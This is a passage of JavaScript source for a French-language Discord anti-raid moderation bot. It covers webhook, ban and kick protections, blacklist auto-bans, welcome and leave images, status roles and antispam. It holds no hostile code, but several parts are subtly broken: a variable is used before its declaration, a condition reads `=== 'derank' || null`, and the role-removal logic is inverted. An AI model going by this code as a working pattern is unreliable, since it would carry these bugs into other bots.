                reason: `Antiwebhook`
              })
                .catch(err => { })
              channele.delete().catch(err => { })
            })
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.logswebhook}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }



      } else { }
    } else if (db.get(`webhooks_${guild.id}`) === "max") {
      const action = await guild.fetchAuditLogs({ limit: 1, type: "WEBHOOK_CREATE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antiwebhook`).then(te => {
            const channels = channel.guild.channels.cache.filter(ch => ch.type !== 'category');
            channels.forEach(async channele => {
              await channele.clone({
                name: channele.name,
                permissions: channele.permissionsOverwrites,
                type: channele.type,
                topic: channele.withTopic,
                nsfw: channele.nsfw,
                birate: channele.bitrate,
                userLimit: channele.userLimit,
                rateLimitPerMembre: channele.rateLimitPerUser,
                permissions: channele.withPermissions,
                position: channele.rawPosition,
                reason: `Antiwebhook`
              })
                .catch(err => { })
              channele.delete().catch(err => { })
            })
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.logswebhook}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const channels = channel.guild.channels.cache.filter(ch => ch.type !== 'category');
            channels.forEach(async channele => {
              await channele.clone({
                name: channele.name,
                permissions: channele.permissionsOverwrites,
                type: channele.type,
                topic: channele.withTopic,
                nsfw: channele.nsfw,
                birate: channele.bitrate,
                userLimit: channele.userLimit,
                rateLimitPerMembre: channele.rateLimitPerUser,
                permissions: channele.withPermissions,
                position: channele.rawPosition,
                reason: `Antiwebhook`
              })
                .catch(err => { })
              channele.delete().catch(err => { })
            })
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.logswebhook}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick(`Antiwebhook`).then(te => {
            const channels = channel.guild.channels.cache.filter(ch => ch.type !== 'category');
            channels.forEach(async channele => {
              await channele.clone({
                name: channele.name,
                permissions: channele.permissionsOverwrites,
                type: channele.type,
                topic: channele.withTopic,
                nsfw: channele.nsfw,
                birate: channele.bitrate,
                userLimit: channele.userLimit,
                rateLimitPerMembre: channele.rateLimitPerUser,
                permissions: channele.withPermissions,
                position: channele.rawPosition,
                reason: `Antiwebhook`
              })
                .catch(err => { })
              channele.delete().catch(err => { })
            })
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.logswebhook}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const channels = channel.guild.channels.cache.filter(ch => ch.type !== 'category');
            channels.forEach(async channele => {
              await channele.clone({
                name: channele.name,
                permissions: channele.permissionsOverwrites,
                type: channele.type,
                topic: channele.withTopic,
                nsfw: channele.nsfw,
                birate: channele.bitrate,
                userLimit: channele.userLimit,
                rateLimitPerMembre: channele.rateLimitPerUser,
                permissions: channele.withPermissions,
                position: channele.rawPosition,
                reason: `Antiwebhook`
              })
                .catch(err => { })
              channele.delete().catch(err => { })
            })
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.logswebhook}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antiwebhook`).then(te => {
            const channels = channel.guild.channels.cache.filter(ch => ch.type !== 'category');
            channels.forEach(async channele => {
              await channele.clone({
                name: channele.name,
                permissions: channele.permissionsOverwrites,
                type: channele.type,
                topic: channele.withTopic,
                nsfw: channele.nsfw,
                birate: channele.bitrate,
                userLimit: channele.userLimit,
                rateLimitPerMembre: channele.rateLimitPerUser,
                permissions: channele.withPermissions,
                position: channele.rawPosition,
                reason: `Antiwebhook`
              })
                .catch(err => { })
              channele.delete().catch(err => { })
            })
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.logswebhook}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const channels = channel.guild.channels.cache.filter(ch => ch.type !== 'category');
            channels.forEach(async channele => {
              await channele.clone({
                name: channele.name,
                permissions: channele.permissionsOverwrites,
                type: channele.type,
                topic: channele.withTopic,
                nsfw: channele.nsfw,
                birate: channele.bitrate,
                userLimit: channele.userLimit,
                rateLimitPerMembre: channele.rateLimitPerUser,
                permissions: channele.withPermissions,
                position: channele.rawPosition,
                reason: `Antiwebhook`
              })
                .catch(err => { })
              channele.delete().catch(err => { })
            })
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.logswebhook}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
      }
    }
  })

  client.on("guildBanRemove", async (guild, user) => {
    const bl = db.get(`${process.env.owner}.blacklist`)
    if (!bl) return
    if (bl.includes(user.id)){
      guild.members.ban(user.id, `Blacklist`).catch(err => { })
    }
  })

  client.on("message", async (message) => {
    const bl = db.get(`${process.env.owner}.blacklist`)
    if (!bl) return
    const guild = message.guild
    if (!guild) return;
    if (bl.includes(message.author.id)){
      guild.members.ban(message.author.id, `Blacklist`).catch(err => { })
    }
  })
  client.on("guildMemberAdd", async (member)=>{
    const bl = db.get(`${process.env.owner}.blacklist`)
    if (!bl) return
    const guild = member.guild
    if (!guild) return
    if (bl.includes(member.id)){
      guild.members.ban(member.id, `BlackList`).catch(e => { })
    }
  })


  client.on("guildBanRemove", async (guild, user) => {
    if (db.get(`massunban_${guild.id}`) === true) {
      const action = await guild.fetchAuditLogs({ limit: 1, type: "MEMBER_BAN_REMOVE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true || db.get(`${guild.id}.${action.executor.id}.wlmd`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antiunban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick(`Antiunban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antiunban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
        guild.members.ban(user, `Antiunban`).catch(err => { })
      
      }
    }else if (db.get(`massunban_${guild.id}`) === "max") {

      const action = await guild.fetchAuditLogs({ limit: 1, type: "MEMBER_BAN_REMOVE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antiban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick(`Antiban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antiunban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
        guild.members.ban(user, `Antiunban`)

      } else { }
    }
  })
  client.on("guildBanAdd", async (guild, user) => {

    let color = db.get(` ${process.env.owner}.color`)
    if (color === null) color = process.env.color
    if (!guild.me.hasPermission("ADMINISTRATOR")) return

    let logChannel = guild.channels.cache.get(db.get(`${guild.id}.raidlog`))
    if (db.get(`massban_${guild.id}`) === true) {
      const action = await guild.fetchAuditLogs({ limit: 1, type: "MEMBER_BAN_ADD" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true || db.get(`${guild.id}.${action.executor.id}.wlmd`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antiban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick(`Antiban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antiban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
        guild.members.unban(user, `Antiban`).catch(err => { })


      } else { }
    } else if (db.get(`massban_${guild.id}`) === "max") {

      const action = await guild.fetchAuditLogs({ limit: 1, type: "MEMBER_BAN_ADD" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antiban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick(`Antiban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antiban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.baner} ${user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
        guild.members.unban(user, `Antiban`)

      } else { }
    }
  })
  client.on("guildMemberRemove", async (member) => {
    if (member.id == client.user.id) return;
    let guild = member.guild
    let color = db.get(` ${process.env.owner}.color`)
    if (color === null) color = process.env.color
    if (!guild) return;
    if (guild == null) return;
  if (!guild.me.hasPermission("ADMINISTRATOR")) return;

    let logChannel = guild.channels.cache.get(db.get(`${guild.id}.raidlog`))
    if (db.get(`massban_${guild.id}`) === true) {
      const action = await guild.fetchAuditLogs({ limit: 1, type: "KICK_MEMBERS" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true || db.get(`${guild.id}.${action.executor.id}.wlmd`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antiban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.kicker} ${member.user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed }).catch(err => { })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.kicker} ${member.user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed }).catch(err => { })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick(`Antiban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.kicker} ${member.user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed }).catch(() => {});
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.kicker} ${member.user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed }).catch(err => { })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antiban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.kicker} ${member.user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed }).catch(err => { })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.kicker} ${member.user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed }).catch(err => { })
          })

        }


      } else { }
    } else if (db.get(`massban_${guild.id}`) === "max") {

      const action = await guild.fetchAuditLogs({ limit: 1, type: "KICK_MEMBERS" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antiban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.kicker} ${member.user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed }).catch(err => { })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.kicker} ${member.user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed }).catch(err => { })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick(`Antiban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.kicker} ${member.user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed }).catch(err => { })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.kicker} ${member.user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed }).catch(err => { })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antiban`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.kicker} ${member.user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed }).catch(err => { })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.kicker} ${member.user.tag}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed }).catch(err => { })
          })

        }

      } else { }
    }
  })
} catch (err) {}


client.on("guildMemberAdd", async (member) => {
  const bl = db.get(`${process.env.owner}.blacklist`)
  if (!bl) return
  if (bl.includes(member.id)){
    member.ban()
  }
  else {

  }
})
client.on("guildMemberAdd", async (member) => {
  const { loadImage, createCanvas, registerFont } = require('canvas');
  const wimage = db.get(`wimage_${member.guild.id}`)
  const wimageon = db.get(`wimageon_${member.guild.id}`)
  
 const wlcmimg = wimage
 
 const canvas = createCanvas(1024, 500);
   const ctx = canvas.getContext('2d');
 
   registerFont('./utils/Uni-Sans.ttf', { family: 'Uni-Sans', weight: 500 });
 
   const pfp = await loadImage(
     member.user.displayAvatarURL({
       format: 'png',
     })
   )
 
   const background = await loadImage(wlcmimg);
   let x = 0
   let y = 0
   ctx.drawImage(background, x, y, 1024, 500)
 
   x = canvas.width / 2 - 125;
   y = canvas.height / 2 - 200;
   ctx.beginPath();
   ctx.save();
   ctx.arc(canvas.width / 2, canvas.height / 2 - 75, 125, 0, Math.PI * 2);
   ctx.strokeStyle = '#400080';
   ctx.lineWidth = 15;
   ctx.stroke();
   ctx.clip();
   ctx.drawImage(pfp, x, y, 250, 250);
   ctx.restore();
 
 
   ctx.font = "85px Uni-Sans";
   ctx.fillStyle = 'white';
   ctx.strokeStyle = 'white';
   ctx.shadowColor = "black"
   ctx.shadowOffsetX = 0;
   ctx.shadowOffsetY = 0; // integer
   ctx.shadowBlur = 10; // integer
   ctx.fillText("WELCOME", 308, 380);
 
   ctx.font = "40px Uni-Sans";
   ctx.fillStyle = 'white';
   ctx.strokeStyle = 'white';
   ctx.fillText(member.user.tag, 360, 430);
   
    let channel = db.fetch(`ichannel_${member.guild.id}`)
  if(!channel)
  {
    return;
  }

  if(channel == "disable"){return;}


  if(!channel1) return; 
  if(channel1 == null) return;
   let channel1 = await client.channels.fetch(`${channel}`);


const des = db.get(`wmessage_${member.guild.id}`)
const desc = des
.replace("-username-", `${member.user.username}`);
  var embed = new Discord.MessageEmbed()
  .addField(member.user.tag + " nous a rejoint", `${desc}`)
 .addField("Nombre de membres -", `${member.guild.memberCount}`)
 .setColor(`RANDOM`)
 channel1.send(embed).catch(() => {});
if (wimageon == "off"){
  return;
}
else {
  const attachment = new Discord.MessageAttachment(canvas.toBuffer(), wimage);
  channel1.send(attachment).catch(() => {});
}

 
 
  
   }
   
 );



 
 
 client.on("guildMemberRemove", async (member) => {
  const Discord = require("discord.js");
  const db = require("quick.db");
  const dsc = db.get(`lmessage_${member.guild.id}`)
  if (dsc == null) return
  const desc = dsc
  .replace("-username-", `${member.user.username}`);

  const { loadImage, createCanvas, registerFont } = require('canvas');
  const wimage = db.get(`limage_${member.guild.id}`)
  const wimageon = db.get(`limageon_${member.guild.id}`)
  
 const wlcmimg = wimage
 
 const canvas = createCanvas(1024, 500);
   const ctx = canvas.getContext('2d');
 
   registerFont('./utils/Uni-Sans.ttf', { family: 'Uni-Sans', weight: 500 });
 
   const pfp = await loadImage(
     member.user.displayAvatarURL({
       format: 'png',
     })
   )
 
   const background = await loadImage(wlcmimg);
   let x = 0
   let y = 0
   ctx.drawImage(background, x, y, 1024, 500)
 
   x = canvas.width / 2 - 125;
   y = canvas.height / 2 - 200;
   ctx.beginPath();
   ctx.save();
   ctx.arc(canvas.width / 2, canvas.height / 2 - 75, 125, 0, Math.PI * 2);
   ctx.strokeStyle = '#400080';
   ctx.lineWidth = 15;
   ctx.stroke();
   ctx.clip();
   ctx.drawImage(pfp, x, y, 250, 250);
   ctx.restore();
 
 
   ctx.font = "85px Uni-Sans";
   ctx.fillStyle = 'white';
   ctx.strokeStyle = 'white';
   ctx.shadowColor = "black"
   ctx.shadowOffsetX = 0;
   ctx.shadowOffsetY = 0; // integer
   ctx.shadowBlur = 10; // integer
   ctx.fillText("AU REVOIR", 250, 380);
 
   ctx.font = "40px Uni-Sans";
   ctx.fillStyle = 'white';
   ctx.strokeStyle = 'white';
   ctx.fillText(member.user.tag, 360, 430);


 let channel = db.fetch(`leavechannel_${member.guild.id}`);
 if(!channel)
 {
   return;
 }
 if(!channel1) return; 
 if(channel1 == null) return;
 let channel1 = await client.channels.fetch(`${channel}`);

 {
 var embed = new Discord.MessageEmbed()
.addField(member.user.tag + " nous a quitter", `${desc}`)
.addField(`Nous Sommes`, `${member.guild.memberCount} Members`)
.setColor(`RANDOM`)
channel1.send(embed).catch(() => {});
 }


  
 if (wimageon == "off"){
  return;
}
else {
  const attachment = new Discord.MessageAttachment(canvas.toBuffer(), wimage);
  channel1.send(attachment).catch(() => {});
}

  }
);
   





  client.on("presenceUpdate", async (oP, nP) => {
    const serverID = db.get(`serv`);
    const onoff = db.get(`soutiens.${serverID}`)
const roole = db.get(`role.${serverID}`);
const status = db.get(`message.${serverID}`);
if (onoff == "on"){

      let guild = client.guilds.cache.get(serverID)
      let role = guild.roles.cache.get(roole)
      if (nP) {

          var user = guild.members.cache.get(nP.user.id);

          if (!user || !user.roles) user = await guild.members.fetch(nP.user.id).catch(() => {}) || false;

          if (!user) return;
          if (nP.activities.some(({
                  state
              }) => state?.includes(status))) {
              if (!user.roles.cache.has(role)) {
                  user.roles.add(role).catch(() => {});
              }

          } else {
            if (!user.roles.cache.has(role)) {
              user.roles.remove(role).catch(() => {});
          }
          }
    }
  }else {return;}
  })
  

  client.on("ready", async () => {
    
    const serverID = db.get(`serv`);
    const onoff = db.get(`soutiens.${serverID}`)

const roole = db.get(`role.${serverID}`);
const status = db.get(`message.${serverID}`);
if (onoff == "on"){
  if (!roole) return;
  if (!status) return;
    let guild = client.guilds.cache.get(serverID)
    let role = guild.roles.cache.get(roole)



      let fm = await guild.members.fetch().catch(() => {})

      let haveStatus = [...fm.filter(user =>
          !user.user.bot && !user.roles.cache.has(role) &&
          user.presence && user.presence.activities.some(({
              state
          }) => state?.includes(status))
      ).values()];

      let noStatus = [...fm.filter(user =>
          !user.user.bot && !user.roles.cache.has(role) &&
          (!user.presence || !user.presence.activities.some(({
              state
          }) => state?.includes(status)))
      ).values()];

      for (const user of haveStatus) {
          await user.roles.add(role).catch(() => {});
          await delay(350);
      }

      for (const user of noStatus) {
          await user.roles.remove(role).catch(() => {});
                    await delay(350);
    }
  }else{return;}
  })

  function delay(delayInms) {
      return new Promise((resolve) => {
          setTimeout(() => {
              resolve(2);
          }, delayInms);
      });
  }


const voiceCollection = new Collection();

client.on("voiceStateUpdate", async (oldState, newState) => {
  const user = await client.users.fetch(newState.id);
  const member = newState.guild.member(user);
  const tempchannel1 = db.get(`tempchannel_${oldState.guild.id}`)
  if (!tempchannel1) return;
  const tempchannel = client.channels.cache.get(tempchannel1)
  if (!tempchannel) return;
  if (!oldState.channel && newState.channel.id === tempchannel1) {
    const channel = await newState.guild.channels.create(user.tag, {
      type: "voice",
      parent: newState.channel.parent,
    }).catch(e => {});

    member.voice.setChannel(channel);
    voiceCollection.set(user.id, channel.id);
  } else if (!newState.channel) {
    if (oldState.channel.id === voiceCollection.get(newState.id))
      return oldState.channel.delete();
  }
});
client.on('ready', ()=>{
  const joinvoc = db.get(`startvoc_${process.env.OWNER}`)
  if (!joinvoc) return;
  const sltcv = client.channels.cache.get(joinvoc)
  if (!sltcv) return;
  sltcv.join().catch(e => { })
})






    const ReactionRoleManager = require("discord-reaction-role");
// Starts updating currents reaction roles
const manager1 = new ReactionRoleManager(client, {
    storage: "./json db/reaction-role.json"
});
// We now have a reactionRoleManager property to access the manager everywhere!
client.reactionRoleManager = manager1;
client.reactionRoleManager.on('reactionRoleAdded',(reactionRole,member,role,reaction) => {

})

client.on('ready', ()=>{
  const streamm = db.get(`stream`)
  const playy = db.get(`play`)
  const watchh = db.get(`wtach`)
  const listenn = db.get(`listen`)
if(streamm){
  client.user.setPresence({ activity: { name: streamm, type: 1, url: "https://www.twitch.tv/002_sans"}})
}
if(playy){
  client.user.setPresence({ activity: { name: playy}})
}
if(watchh){
  client.user.setPresence({ activity: { name: watchh, type: "WATCHING" }})
}
if(listenn){
  client.user.setPresence({ activity: { name: listenn, type: "LISTENING" }})
}
})

client.on("guildMemberAdd", async (member) => {
  let autor = db.fetch(`autorole_${member.guild.id}`);
  if(!autor)
  {
    return;
  }
  var role = member.guild.roles.cache.get(`${autor}`);
  member.roles.add(role);
  
  
  
  });

  
  const usersMap = new Map();
  const LIMIT = 5;
  const TIME = 6000;
  const DIFF = 7000;
 
  client.on("message", async message => {
    if(db.get(`antispam_${message.guild.id}`) === true){
      if(message.author.bot) return;
      const guild = message.guild
      let pun = guild.punishment;
      if (message.author.bot) return;
      if (usersMap.has(message.author.id)) {
        const userData = usersMap.get(message.author.id);
        const { lastMessage, timer } = userData;
        const difference = message.createdTimestamp - lastMessage.createdTimestamp;
        let msgCount = userData.msgCount;
        if (difference > DIFF) {
          clearTimeout(timer);
          userData.msgCount = 1;
          userData.lastMessage = message;
          userData.timer = setTimeout(() => {
            usersMap.delete(message.author.id);
          }, TIME);
          usersMap.set(message.author.id, userData);
        } else {
          ++msgCount;
          if (parseInt(msgCount) >= LIMIT) {
              message.channel.guild.members.cache
                .get(message.author.id)
                .kick()
                .then(k => {
                  message.channel.send(new Discord.MessageEmbed()
           .setColor(Color)
          .setDescription(`**${message.author.username}** a été kick pour avoir spammer!`));
                }).catch(e => { });
